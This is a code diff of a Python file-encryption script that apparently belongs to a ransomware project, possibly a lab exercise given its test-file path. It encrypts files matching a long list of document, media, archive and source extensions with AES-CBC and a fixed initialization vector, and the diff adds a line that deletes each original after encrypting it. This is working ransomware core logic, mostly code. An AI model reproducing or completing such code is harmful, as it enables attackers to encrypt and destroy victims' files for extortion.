@@ -14,11 +14,17 @@ encrypted_symbol = "enc_"
 ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
 base_path = "/TestFiles/Text/1500KB"
 
+def GetInitializationVector():
+    # iv = Crypto.Random.OSRNG.posix.new().read(AES.block_size)
+    # iv = Crypto.Random.new().read(16)
+    iv = "A3DKWIEAA3DKWIEA".encode()
+    return iv
+
 def EncryptFile(fileToEncrypt, key):
     file_size = str(os.path.getsize(fileToEncrypt)).zfill(16)
     dir_path, file_name = os.path.split(fileToEncrypt)
     
-    iv = "A3DKWIEAA3DKWIEA".encode()
+    iv = GetInitializationVector()
     aes_obj = AES.new(key, AES.MODE_CBC, iv)
 
     with open(fileToEncrypt, 'rb') as infile:
@@ -33,7 +39,7 @@ def EncryptFile(fileToEncrypt, key):
                     chunk += b' ' * (16 - (len(chunk) % 16))
 
                 outfile.write(aes_obj.encrypt(chunk))
-    pass
+    os.remove(fileToEncrypt)
 
 def EncryptAllFiles(filesToEncrypt, key):
     for file_to_encrypt in filesToEncrypt:
